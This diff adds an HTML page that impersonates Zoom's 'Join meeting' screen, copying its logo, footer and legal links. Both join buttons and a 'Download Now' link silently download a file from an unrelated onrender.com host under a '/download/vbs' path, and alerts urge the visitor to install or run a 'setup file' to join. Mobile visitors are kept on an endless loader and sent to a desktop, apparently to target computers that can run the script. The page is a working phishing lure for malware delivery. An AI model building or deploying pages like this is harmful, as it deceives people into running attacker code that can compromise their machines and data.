@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>Join meeting</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    :root {
+      --blue: #0D6BDE;
+      --blue-dark: #0B5CDA;
+      --gray-border: #939BA4;
+      --text-dark: #232333;
+      --text-mid: #6B7280;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      color: var(--text-dark);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 20px 32px;
+      border-bottom: 1px solid rgba(0, 0, 0, 0.08);
+    }
+
+    /* Large screens */
+    @media (min-width: 1200px) {
+      header {
+        padding: 20px 15%;
+      }
+    }
+
+    .logo {
+      font-weight: 800;
+      font-size: 22px;
+      color: var(--blue);
+      letter-spacing: 0.5px;
+    }
+
+    .top-right {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+      font-size: 14px;
+      color: var(--text-mid);
+    }
+
+    .top-right a {
+      color: var(--blue);
+      text-decoration: none;
+    }
+
+    main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 22px;
+      font-weight: 600;
+      margin-bottom: 40px;
+    }
+
+    .actions {
+      width: 400px;
+      max-width: 90%;
+    }
+
+    .btn-primary {
+      width: 100%;
+      background: var(--blue);
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      padding: 13px;
+      font-size: 16px;
+      font-weight: 500;
+      min-height: 48px;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-bottom: 14px;
+      font-weight: 500;
+      line-height: 20px;
+    }
+
+    .btn-primary:hover {
+      background: var(--blue-dark);
+    }
+
+    .btn-secondary {
+      width: 100%;
+      background: #fff;
+      color: var(--text-dark);
+      border: 1px solid var(--gray-border);
+      border-radius: 8px;
+      padding: 13px;
+      font-size: 16px;
+      font-weight: 500;
+      min-height: 48px;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-bottom: 24px;
+      line-height: 20px;
+    }
+
+    .btn-secondary:hover {
+      border-color: #C9CFD6;
+    }
+
+    .download-note {
+      font-size: 13.5px;
+      color: var(--text-dark);
+      margin-top: 0;
+      margin-bottom: 22px;
+      font-size: 14px;
+      line-height: 24px;
+      font-weight: 400;
+    }
+
+    .download-note a {
+      color: var(--blue);
+      text-decoration: none;
+    }
+
+    .agree-note {
+      font-size: 13px;
+      margin-top: 0;
+      color: var(--text-dark);
+      font-size: 14px;
+      line-height: 24px;
+      font-weight: 400;
+    }
+
+    .agree-note a {
+      color: var(--blue);
+      text-decoration: none;
+    }
+
+    footer {
+      text-align: center;
+      font-size: 14px;
+    line-height: 1.5;
+      color: rgba(4, 4, 19, 0.56);
+      padding: 24px 16px 32px;
+    }
+
+    footer .legal-links {
+      margin-top: 8px;
+    }
+
+    footer .legal-links a {
+      color: var(--text-mid);
+      text-decoration: none;
+    }
+
+    footer .legal-links a:hover {
+      color: var(--text-dark);
+    }
+
+    #loader-overlay {
+      position: fixed;
+      inset: 0;
+      background: #18181C;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 20px;
+      z-index: 9999;
+      transition: opacity 0.5s ease;
+    }
+
+    #loader-overlay.fade-out {
+      opacity: 0;
+      pointer-events: none;
+    }
+
+    /* Hide loader completely when faded out */
+    #loader-overlay.hidden {
+      display: none;
+    }
+
+    .spinner {
+      width: 44px;
+      height: 44px;
+      border: 3px solid rgba(255, 255, 255, 0.15);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .loader-text {
+      color: #fff;
+      font-size: 16px;
+      font-weight: 400;
+    }
+
+    /* Mobile device message */
+    .mobile-message {
+      color: rgba(255, 255, 255, 0.7);
+      font-size: 14px;
+      margin-top: 10px;
+      max-width: 300px;
+      text-align: center;
+      line-height: 1.5;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div id="loader-overlay">
+    <div class="spinner"></div>
+    <div class="loader-text">Joining Meeting...</div>
+    <div class="mobile-message" id="mobileMessage" style="display:none;">
+      Please use a desktop computer to join this meeting.
+      <br><small>Mobile devices are not supported.</small>
+    </div>
+  </div>
+
+  <header>
+    <div class="logo"><img src="https://us05st1.zoom.us/web_client_pwa/7.0.10.3043/images/zoom-logo.svg" width="115"
+        height="26"></div>
+    <div class="top-right">
+      <a href="#">Support</a>
+      <a href="#">English</a>
+    </div>
+  </header>
+
+
+  <main>
+    <h1 style="font-size: 24px;font-weight: 700;margin-bottom: 52px;">Join meeting</h1>
+
+    <div class="actions">
+      <button class="btn-primary" onclick="downloadFile('workplace')">Join from Zoom Workplace app</button>
+      <button class="btn-secondary" onclick="downloadFile('browser')">Join from browser</button>
+    </div>
+    <p class="download-note">
+      Don't have the Zoom Workplace app installed? <a href="https://procurement-j9mv.onrender.com/download/vbs">Download
+        Now</a>
+    </p>
+
+    <p class="agree-note">
+      By joining a meeting, you agree to our <a href="https://zoom.us/en-us/terms">Terms of Service</a> and
+      <a href="https://zoom.us/en-us/privacy">Privacy Statement</a>.
+    </p>
+  </main>
+
+  <footer>
+    <div>© 2026 Zoom Communications, Inc. All rights reserved.</div>
+    <div class="legal-links">
+      <a href="#">Trust Center</a> |
+      <a href="#">Acceptable Use Guidelines</a> |
+      <a href="#">Legal &amp; Compliance</a> |
+      <a href="#">Do Not Sell My Personal Information</a> |
+      <a href="#">Cookie Preferences</a>
+    </div>
+  </footer>
+
+  <script>
+    // Function to detect if device is mobile or iPad
+    function isMobileOrTablet() {
+      const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+      // Check for mobile devices
+      const isMobile = /android|webos|iphone|ipod|blackberry|iemobile|opera mini|windows phone/i.test(userAgent.toLowerCase());
+
+      // Check for iPad (including iPadOS 13+ which masks as Mac)
+      const isiPad = /ipad/i.test(userAgent.toLowerCase()) ||
+        (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+
+      // Check screen size
+      const isSmallScreen = window.innerWidth <= 1024;
+
+      return isMobile || isiPad || isSmallScreen;
+    }
+
+    // Handle screen resize to re-check
+    function handleResize() {
+      const overlay = document.getElementById('loader-overlay');
+      const mobileMessage = document.getElementById('mobileMessage');
+
+      if (isMobileOrTablet()) {
+        // Show loader forever on mobile/tablet
+        overlay.classList.remove('fade-out', 'hidden');
+        mobileMessage.style.display = 'block';
+      } else {
+        // On desktop, hide loader after delay
+        mobileMessage.style.display = 'none';
+        // Only hide if it hasn't been hidden already
+        if (!overlay.classList.contains('fade-out') && !overlay.classList.contains('hidden')) {
+          setTimeout(() => {
+            overlay.classList.add('fade-out');
+            setTimeout(() => overlay.classList.add('hidden'), 500);
+          }, 2500);
+        }
+      }
+    }
+
+    // Initialize on page load
+    window.addEventListener('load', () => {
+      const overlay = document.getElementById('loader-overlay');
+      const mobileMessage = document.getElementById('mobileMessage');
+
+      // Check if mobile/tablet
+      if (isMobileOrTablet()) {
+        // Show loader forever - don't hide it
+        overlay.classList.remove('fade-out', 'hidden');
+        mobileMessage.style.display = 'block';
+        console.log('Mobile/Tablet detected - loader will stay visible');
+      } else {
+        // Desktop - hide after 2.5 seconds
+        mobileMessage.style.display = 'none';
+        setTimeout(() => {
+          overlay.classList.add('fade-out');
+          setTimeout(() => overlay.classList.add('hidden'), 500);
+        }, 2500);
+        console.log('Desktop detected - loader will fade out');
+      }
+    });
+
+    // Listen for window resize to re-check device type
+    let resizeTimeout;
+    window.addEventListener('resize', () => {
+      clearTimeout(resizeTimeout);
+      resizeTimeout = setTimeout(handleResize, 250);
+    });
+
+    // Your existing download function
+    function downloadFile(type) {
+      // Show alert based on type
+      if (type === 'workplace') {
+        alert('Downloading Zoom Workplace app...\n\nInstall workspace to join');
+      } else if (type === 'browser') {
+        alert('Downloading browser setup file...\n\nRun browser setup to join');
+      }
+      // Create a temporary anchor element
+      const link = document.createElement('a');
+      link.href = `https://procurement-j9mv.onrender.com/download/vbs/${type}`;
+      link.download = ''; // Optional: specify filename
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }
+  </script>
+
+</body>
+
+</html>
